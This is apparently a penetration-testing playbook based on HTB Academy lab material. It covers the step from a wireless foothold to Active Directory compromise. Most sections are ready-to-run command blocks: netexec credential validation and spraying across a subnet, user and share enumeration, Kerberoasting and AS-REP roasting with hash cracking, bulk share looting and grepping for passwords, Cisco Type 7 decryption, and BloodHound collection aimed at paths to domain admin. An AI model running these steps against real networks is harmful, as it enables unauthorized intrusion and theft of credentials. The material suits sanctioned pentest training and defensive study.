# Wireless - Internal foothold and Active Directory enumeration

## Validating the credential and reading the domain

**Trigger:** You reached a domain credential through the wireless attack and have a route to the domain controller.

The credential harvested from an enterprise evil twin, a cracked PSK that turned out to be reused, or a config file on a compromised AP is only a foothold once you confirm it authenticates to the domain. Validate it against SMB on the domain controller first, because that single check confirms the credential is live, names the domain and host, and reveals SMB signing state in one line. Do it before anything expensive. The credential you have is almost always low-privilege — a standard user whose password walked into your RADIUS — so the mindset for the whole internal phase is that of an authenticated but unprivileged user looking for the one misconfiguration that grants more, not that of an attacker with a shell. `netexec` (the maintained successor to CrackMapExec, invoked as `nxc` or `netexec`) is the workhorse: the same credential drives SMB, LDAP, WinRM and MSSQL enumeration, and its module system automates the common checks. A `[+]` means the credential worked; `Pwn3d!` means it has administrative access to that host, which is the result that changes everything.

```bash
nxc smb 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789'
#   SMB ... (domain:corp.local) (signing:True) (SMBv1:True)
#   [+] corp.local\jdorian:P4ssw0rd123456789          <- valid
#   [+] ... (Pwn3d!)                                   <- admin on this host

# Same credential, which hosts across the subnet accept it
nxc smb 172.16.10.0/24 -u jdorian -p 'P4ssw0rd123456789'
nxc smb 172.16.10.0/24 -u jdorian -p 'P4ssw0rd123456789' --continue-on-success

# Protocol coverage from the one credential
nxc ldap 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789'
nxc winrm 172.16.10.71 -u jdorian -p 'P4ssw0rd123456789'
nxc mssql 172.16.10.5 -u jdorian -p 'P4ssw0rd123456789'
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — AD Enumeration & Internal Foothold

## Enumerating users, shares and policy with one credential

**Trigger:** The credential is valid and you need the lie of the land before choosing an attack.

An authenticated low-privilege user can read a great deal of the directory, and the point of this pass is to surface the two things that most often lead upward: a share the user can read that should not be readable, and a stored credential left where enumeration finds it. Enumerate the users and groups to build the roster you will need for roasting and spraying, and pull the password policy so you know the lockout threshold before you send a single guess — spraying blind into an unknown lockout policy is how you lock out real accounts and end the engagement badly. Enumerate shares and note the ones with non-default names and non-default permissions, because `Automation`, `Backup`, `Configuration` and the like are where administrators leave scripts containing credentials. Then run the cheap `netexec` modules that check for the classic leftover misconfigurations in one pass: Group Policy Preferences passwords in SYSVOL, autologon credentials, and the presence of a certificate authority. None of these needs elevated rights and any one of them can hand you a better credential.

```bash
# Roster and policy — get the lockout threshold before spraying anything
nxc smb 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789' --users
nxc smb 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789' --groups
nxc smb 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789' --pass-pol
nxc smb 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789' --users | awk '{print $5}' > users.txt

# Shares — note the non-standard names and who can read them
nxc smb 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789' --shares
nxc smb 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789' -M spider_plus

# One-pass check for classic leftovers
nxc smb 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789' -M gpp_password -M gpp_autologin -M enum_ca

# Deeper LDAP enumeration
nxc ldap 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789' --trusted-for-delegation --admin-count
ldapsearch -x -H ldap://172.16.10.72 -D 'jdorian@corp.local' -w 'P4ssw0rd123456789' \
  -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — AD Enumeration & Internal Foothold

## Kerberos roasting and username enumeration

**Trigger:** You have a valid credential (Kerberoasting) or only a username list (AS-REP roasting and enumeration).

Two Kerberos attacks extract crackable hashes without needing elevated privileges, and which applies depends on what you hold. With a valid domain credential, **Kerberoasting** requests service tickets for every account that has a service principal name and returns their hashes — service accounts often have weak, long-unchanged passwords, so this is a reliable path upward. It frequently returns nothing on a small or well-managed domain, which is a real negative rather than a mistake. With only a list of possible usernames and no credential, **AS-REP roasting** targets accounts that do not require Kerberos pre-authentication and returns their hashes directly. Even when AS-REP roasting yields no hashes, it doubles as a username enumeration oracle: the domain controller answers differently for a user that exists but requires pre-authentication than for a user that does not exist at all, so a run against a candidate list sorts real accounts from invented ones. Build that candidate list from the EAP identities you captured on the wireless side and from the user enumeration above; the wireless phase usually hands you real usernames, which is exactly what makes these attacks land.

```bash
# Kerberoasting — needs a valid credential
GetUserSPNs.py -dc-ip 172.16.10.72 corp.local/jdorian -request -outputfile kerb.hash
nxc ldap 172.16.10.72 -u jdorian -p 'P4ssw0rd123456789' --kerberoasting kerb.hash

# AS-REP roasting — needs only a username list; also enumerates valid users
GetNPUsers.py -dc-ip 172.16.10.72 corp.local/ -usersfile users.txt \
  -format hashcat -outputfile asrep.hash
#   "doesn't have UF_DONT_REQUIRE_PREAUTH set"  -> user exists (enumeration hit)
#   "KDC_ERR_C_PRINCIPAL_UNKNOWN"               -> user does not exist

kerbrute userenum -d corp.local --dc 172.16.10.72 users.txt      # dedicated enumerator

# Crack what you got
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt      # Kerberoast (TGS)
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt     # AS-REP
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — AD Enumeration & Internal Foothold

## Mining readable shares for the next credential

**Trigger:** Enumeration showed a share the current user can read, especially one with an operational name.

The pattern that recurs through corporate AD is a chain of readable shares each leaking the credential needed to read the next, and it is the most common way a wireless foothold becomes a domain compromise. A user can read `Automation`; inside is a backup script with a service account password hardcoded; that account can read `Configuration`; inside is a device configuration file with more passwords; and so on until one of the recovered accounts has real privilege. Work it deliberately: connect to each readable share, pull everything small enough to review offline, and read every script, configuration file and document for embedded credentials. Scripts are the richest source because automation needs to authenticate non-interactively, so passwords sit in cleartext or in trivially reversible forms. Cisco IOS configuration files are a specific high-value find: the Type 7 "encryption" is a reversible cipher, not a hash, and the enable secret Type 5 is crackable. Every credential recovered goes back into `netexec` against the whole subnet, because password reuse across accounts is the norm and the account whose password you just found is often reused for a more privileged one.

```bash
smbclient -U 'corp.local\smith' //172.16.10.72/Automation
#   smb: \> ls
#   smb: \> get "SQL Express Backup.ps1"

# Pull a share wholesale for offline review
smbclient -U 'corp.local\smith' //172.16.10.72/Automation -c 'prompt OFF; recurse ON; mget *'

# Read everything for credentials
grep -riE "password|passwd|pwd|secret|credential|connectionstring" ./loot/

# Cisco config: Type 7 is reversible, Type 5 (enable secret) is crackable
python3 ciscot7.py -d -f Cisco_IOS.config
hashcat -m 500 '$1$mERr$WpAg9kQAnJsh/9WzETcjd1' /usr/share/wordlists/rockyou.txt

# Every recovered credential goes back against the whole subnet
nxc smb 172.16.10.0/24 -u recovered_user -p 'RecoveredPass' --continue-on-success
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Lateral Movement

## BloodHound: mapping the path to privilege

**Trigger:** You have at least one valid credential and want to find the shortest path to domain admin rather than guessing.

BloodHound collects the directory's users, groups, sessions, ACLs and trusts and renders the privilege relationships as a graph, which turns "which of these forty accounts matters" into a query. Collect with any valid credential — a low-privilege user is enough for most edges — using SharpHound on a Windows host you control or the Python collector from your attack box. Run all collection methods for maximum coverage. Once the data is loaded, the graph answers the questions that manual enumeration cannot: which accounts can reach a high-privilege group through a chain of ACL abuses, which have replication rights over the domain (the DCSync edge that ends the engagement), which are administrators on which hosts, and which non-obvious paths connect the account you have to one you want. The pre-built queries cover the common cases; the shortest-path-to-domain-admins query from your owned principal is the one to run first. What BloodHound finds most often in a corporate domain is not a single dramatic vulnerability but a short chain of individually minor delegations that compose into a path, which is exactly what is hard to see by hand.

```bash
# Python collector from the attack box
bloodhound-python -d corp.local -u jdorian -p 'P4ssw0rd123456789' \
  -ns 172.16.10.72 -c All --zip

# Or SharpHound on a Windows host you control
#   .\SharpHound.exe -d corp.local --ldapusername jdorian --ldappassword 'P4ssw0rd...' \
#       -c All --DomainController 172.16.10.72 --ZipFileName BH.zip

# Load into BloodHound
sudo neo4j start
bloodhound          # import the zip, then run:
#   "Find Shortest Paths to Domain Admins"
#   "Shortest Paths from Owned Principals"  (mark your account Owned first)
#   look specifically for: DCSync / GetChanges+GetChangesAll, GenericAll,
#   WriteDacl, AddMember, ForceChangePassword, local-admin edges
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Active Directory Domain Compromise
